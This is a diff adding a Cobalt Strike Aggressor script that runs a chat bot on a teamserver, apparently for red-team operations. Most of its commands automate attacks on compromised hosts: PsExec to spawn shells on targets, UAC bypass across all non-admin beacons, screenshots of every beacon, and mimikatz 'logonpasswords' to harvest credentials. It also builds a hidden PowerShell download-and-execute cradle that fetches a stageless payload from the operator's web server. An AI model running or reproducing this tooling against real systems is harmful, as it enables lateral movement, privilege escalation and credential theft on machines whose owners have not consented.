@@ -1,0 +1,190 @@
+# This is a bot for Cobalt Strike!
+# Features:
+# - Welcome users to your teamserver
+# - Play ping pong
+# - List beacons by ID
+# - List listeners
+# - PsExec from the event log
+# - Automatically bypass UAC
+# - Screenshot all beacons
+
+# PsExec against $target from $bid
+# TODO figure out how to use with make_token
+sub psexecTarget {
+    ($bid, $target, $listener) = @_; # @_ contains the arguments for the subroutine.
+    say("Owning $target with psexec_psh.");
+    bpsexec_psh($bid, $target, $listener);
+}
+
+# Attempt to bypass UAC on all non-admin shells
+sub elevateAll {
+    $listener = $1;
+
+    # Iterate over all beacons with beacons()
+    foreach $b (beacons()) {
+        # Get the id field from $b
+        $bid = $b['id'];
+
+        if (!-isadmin $bid) {
+            say("Attempting to elevate beacon $bid");
+            bbypassuac($bid, $listener);
+        }
+        sleep(1000);
+    }
+}
+
+# Get PowerShell DownloadString payload
+sub getDownloadString {
+    foreach $s (sites()) {
+        # Check if the site has powershell in the description
+        if ($s['Description'] hasmatch "powershell") {
+            # Build URL and DownloadString
+            $url = "http://" . $s['Host'] . ":" . $s['Port'] . $s['URI'];
+            $downloadString = "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('";
+            $downloadString .= $url . "'))\"";
+
+            println("Returning DownloadString: $downloadString");
+            say("Found Powershell DownloadString payload: \c9$downloadString\c0");
+            return true;
+        }
+    }
+    return false;
+}
+
+# Create PowerShell DownloadString payload
+sub createDownloadString {
+    local ('$listener $script $host $url');
+
+    if (-istrue getDownloadString()){
+        println("DownloadString already exists!");
+        return;
+    }
+    else {
+        $listener = $1;
+
+        $host = listener_info($listener)['host'];
+
+        artifact_stageless($listener, "powershell", "x86", $null, $this);
+        yield;
+
+        $script = $1;
+
+        $url = site_host($host, "80", "/abc", $script, "text/plain", "Scripted Web Delivery(powershell)");
+
+        $downloadString = "powershell.exe -nop -w hidden -c \"IEX ((New-Object Net.WebClient).DownloadString('";
+        $downloadString .= $url . "'))\"";
+
+        println("Returning DownloadString $downloadString");
+        say("Here's your DownloadString: \c9$downloadString\c0");
+    }
+}
+
+on event_join {
+    elog("User \c9$1\c7 joined! Welcome to the teamserver.");
+}
+
+on event_public {
+    if (substr($2, 0, 1) eq "!") {
+        @input = split(" ", $2); # Split incoming command on spaces
+        $cmd = @input[0]; # Command is !<cmd> arg1 arg2...
+        @args = sublist(@input, 1); # sublist gets everything after !cmd
+
+        # Log to script console for debug purposes
+        println("Command received: $cmd");
+        println("Arguments: " . @args);
+
+        if ($cmd eq "!ping") {
+            say("pong!");
+        }
+        # List all beacons by ID
+        else if ($cmd eq "!beacons") {
+            say ("Number of Beacons: " . size(beacons()));
+            foreach $b (beacons()) {
+                say("Beacon: $b['id'] on $b['computer'] as $b['user']");
+            }
+        }
+        # List all listeners
+        else if ($cmd eq "!listeners") {
+            foreach $l (listeners()) {
+                say("Listener: $l");
+            }
+        }
+        # psexec to target host from beacon
+        else if ($cmd eq "!psexec") {
+            if (size(@args) == 3) {
+                $bid      = @args[0];
+                $target   = @args[1];
+                $listener = @args[2];
+
+                # Log to script console for debug purposes
+                println("Beacon ID: $bid");
+                println("Target: $target");
+                println("Listener: $listener");
+
+                psexecTarget($bid, $target, $listener);
+            }
+        }
+        # Elevate all non-admin beacons
+        else if ($cmd eq "!elevate") {
+            $listener = @args[0];
+
+            elevateAll($listener);
+        }
+        # Screenshot all beacons
+        else if ($cmd eq "!screenshot") {
+            foreach $b (beacons()){
+                bscreenshot($b['id']);
+                sleep(1000);
+            }
+        }
+        # Get DownloadString to stage Beacon
+        else if ($cmd eq "!downloadstring") {
+            if (!@args) {
+                getDownloadString();
+            }
+            else {
+                $listener = @args[0];
+
+                createDownloadString($listener);
+            }
+        }
+        else if ($cmd eq "!checkin") {
+            foreach $b (beacons()){
+                bcheckin($b['id']);
+                sleep(1000);
+            }
+        }
+        else if ($cmd eq "!mimikatz") {
+            foreach $b (beacons()) {
+                blogonpasswords($b['id']);
+                sleep(1000);
+            }
+        }
+        else if ($cmd eq "!help") {
+            say("Beep boop! Here are my commands:");
+            say("ping:\t\t\tPong!");
+            say("beacons:\t\t\tList all beacons.");
+            say("listeners:\t\t\tList all listeners.");
+            say("psexec <bid> <target> <listener>:\tSpawn a shell on <target> from <bid>.");
+            say("elevate:\t\t\tAttempt to bypass UAC on all non-admin beacons.");
+            say("screenshot:\t\t\tAttempt to screenshot all beacons.");
+            say("downloadstring:\t\t\tGet a Powershell DownloadString payload.");
+            say("checkin:\t\t\tAsk all beacons to checkin.");
+            say("mimikatz:\t\t\tTask all beacons to run logonpasswords.");
+        }
+    }
+}
+
+on beacon_initial {
+    # If incoming beacon is admin, call it out in event log
+    if (-isadmin $1) {
+        # $1 for beacon_initial event is beacon ID, have to get metadata with bdata($1)
+        $b = bdata($1);
+        say("\c5New admin beacon: \c2" . $b['user'] . "@" . $b['computer'] . "\c5!");
+    }
+}
+
+# Log all beacon tasks to event log for debugging purposes
+on beacon_tasked {
+    elog("Beacon $1 tasked: $2");
+}
